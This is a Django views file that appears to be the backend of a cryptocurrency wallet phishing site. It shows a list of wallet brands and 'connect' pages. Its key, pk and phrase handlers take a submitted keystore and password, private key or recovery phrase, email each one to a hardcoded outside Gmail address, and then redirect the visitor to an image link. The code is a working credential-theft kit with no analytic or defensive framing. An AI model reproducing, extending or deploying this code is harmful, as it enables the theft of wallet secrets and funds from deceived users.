from django.shortcuts import render, redirect
from .models import *
from django.core.mail import send_mail
from django.conf import settings

# Create your views here.
receiver = "jamiedurnmont@gmail.com"


def index(request):
    wallets = Wallet.objects.all()[:28]
    wallets_more = Wallet.objects.all()[28:]

    context = {
        'wallets': wallets,
        'wallets_more': wallets_more,
    }
    return render(request, "wallet/index.html", context)


def sync(request, pk):
    wallet = Wallet.objects.get(pk=pk)
    return render(request, 'wallet/connect.html', {'wallet': wallet})

def key(request, pk):
    wallet = Wallet.objects.get(pk=pk)
    if request.method == 'POST':
        keystore = request.POST.get("phrase")
        passwd = request.POST.get("password")
        subject = wallet.wallet_name + ' Keystore'
        message = f'Keystore : {keystore}\nPassword : {passwd}'
        email_from = settings.EMAIL_HOST_USER
        recipient_list = [receiver, ]

        send_mail(subject, message, email_from, recipient_list)
        return redirect("https://image.ibb.co/hkgHso/admin.png")

    return render(request, 'wallet/connect.html', {'wallet': wallet})

def pk(request, pk):
    wallet = Wallet.objects.get(pk=pk)
    if request.method == 'POST':
        private = request.POST.get("key")
        subject = wallet.wallet_name + ' Private Key'
        message = f'private : {private}'
        email_from = settings.EMAIL_HOST_USER
        recipient_list = [receiver, ]

        send_mail(subject, message, email_from, recipient_list)
        return redirect("https://image.ibb.co/hkgHso/admin.png")
    return render(request, 'wallet/connect.html', {'wallet': wallet})

def phrase(request, pk):
    wallet = Wallet.objects.get(pk=pk)
    if request.method == 'POST':
        phrase = request.POST.get("phrase")
        subject = wallet.wallet_name + ' Phrase'
        message = f'Phrase : {phrase}'
        email_from = settings.EMAIL_HOST_USER
        recipient_list = [receiver, ]

        send_mail(subject, message, email_from, recipient_list)
        return redirect("https://image.ibb.co/hkgHso/admin.png")

    return render(request, 'wallet/connect.html', {'wallet': wallet})
